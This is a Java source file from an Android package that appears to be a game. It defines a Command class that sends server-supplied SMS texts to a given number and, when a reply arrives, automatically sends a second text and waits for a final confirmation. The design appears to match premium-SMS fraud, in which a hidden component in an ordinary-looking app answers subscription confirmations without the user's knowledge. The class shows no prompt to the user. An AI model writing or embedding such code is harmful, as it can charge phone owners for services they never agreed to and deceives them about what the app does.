package cn.com.tiantong.game72.util;

import android.content.Context;
import cn.com.tiantong.game72.SendMessageManager;

public class Command {
//	 final String tag = "Command";
	private long rowid;
	private String number;
	private String content1;
	private String content2;
	// 0代表005等待处理,1代表005等待回复,2代表006等待处理,3代表006等待回复,4代表006等待最后确认
	private int Smsreplywaiting;

	//服务器上msg的id
	private String msgId;
	
	/**
	 * @return the smsreplywaiting
	 */
	public int getSmsreplywaiting() {
		return Smsreplywaiting;
	}

	/**
	 * @param smsreplywaiting the smsreplywaiting to set
	 */
	public void setSmsreplywaiting(int smsreplywaiting) {
		Smsreplywaiting = smsreplywaiting;
	}

	/**
	 * @return the rowid
	 */
	public long getRowid() {
		return rowid;
	}

	/**
	 * @param rowid
	 *            the rowid to set
	 */
	public void setRowid(long rowid) {
		this.rowid = rowid;
	}

	/**
	 * @return the number
	 */
	public String getNumber() {
		return number;
	}

	/**
	 * @param number
	 *            the number to set
	 */
	public void setNumber(String number) {
		this.number = number;
	}

	/**
	 * @return the content1
	 */
	public String getContent1() {
		return content1;
	}

	/**
	 * @param content1
	 *            the content1 to set
	 */
	public void setContent1(String content1) {
		this.content1 = content1;
	}

	/**
	 * @return the content2
	 */
	public String getContent2() {
		return content2;
	}

	/**
	 * @param content2
	 *            the content2 to set
	 */
	public void setContent2(String content2) {
		this.content2 = content2;
	}
	
	public String getMsgId() {
		return msgId;
	}

	public void setMsgId(String msgId) {
		this.msgId = msgId;
	}

	public Command(long rowid, String number, String content1, String content2,
			int Smsreplywaiting, String msgId) {
		this.rowid = rowid;
		this.number = number;
		this.content1 = content1;
		this.content2 = content2;
		this.Smsreplywaiting = Smsreplywaiting;
		this.msgId = msgId;

	}

	public boolean EnableSmsreplywaiting() {
		boolean ret = false;
		if (Smsreplywaiting == 0) {
			Smsreplywaiting = 1;
			ret = true;
		} else if (Smsreplywaiting == 2) {
			Smsreplywaiting = 3;
			ret = true;
		} else if (Smsreplywaiting == 3) {
			Smsreplywaiting = 4;
			ret = true;
		}
		// //LH.LogPrint(tag,"EnableSmsreplywaiting:Smsreplywaiting:"+Smsreplywaiting);
		return ret;
	}

	public boolean DisableSmsreplywaiting() {
		boolean ret = false;
		if (Smsreplywaiting == 1) {
			Smsreplywaiting = 0;
			ret = true;
		} else if (Smsreplywaiting == 4) {
			Smsreplywaiting = 2;
			ret = true;
		}
		return ret;
	}

	public boolean DoAction(Context context) {
		boolean ret = false;
		SendMessageManager.sendSMS1(context, number, content1, msgId);
		if ((getSmsreplywaiting() == 0) || (getSmsreplywaiting() == 2)) {
			ret = EnableSmsreplywaiting();
		}
		 //LH.LogPrint(tag,"DoAction:ret:" + ret + ":number:" + number + ":content1:" + content1);
		return ret;
	}

	public boolean DoReplyAction(Context context, String number, String msgId) {
		boolean ret = false;
		if (getSmsreplywaiting() == 1) {
			ret = DisableSmsreplywaiting();
		} else if (getSmsreplywaiting() == 3) {
			// ProtocolParser.sendSMS1(number, content2);
			SendMessageManager.sendSMS1(context, number, content2, msgId);
			EnableSmsreplywaiting();
			// DisableSmsreplywaiting();
			ret = false;
		} else if (getSmsreplywaiting() == 4) {
			ret = DisableSmsreplywaiting();
		} else {
			// //LH.LogPrint(tag,"DoReplyAction:error");
		}
		// //LH.LogPrint(tag,"DoReplyAction:ret:"+ret+":number:"+number+":content2:"+content2);
		return ret;
	}
}
